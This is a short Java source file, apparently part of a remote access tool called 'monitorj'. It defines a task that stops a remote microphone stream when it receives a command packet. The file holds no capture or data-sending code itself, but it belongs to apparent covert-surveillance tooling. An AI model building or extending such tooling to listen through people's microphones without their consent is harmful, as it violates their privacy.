package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.client.threads.RemoteMicrophoneStream;

import java.io.IOException;

/**
 * Created by Josh on 4/07/2015.
 */
public class RemoteMicStopTask extends PacketTask {

    public RemoteMicStopTask() {
        super(Packets.REMOTE_MIC_STOP.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        if(RemoteMicStartTask.remoteMicStream.isAlive())
            RemoteMicrophoneStream.isStreaming = false;
    }
}
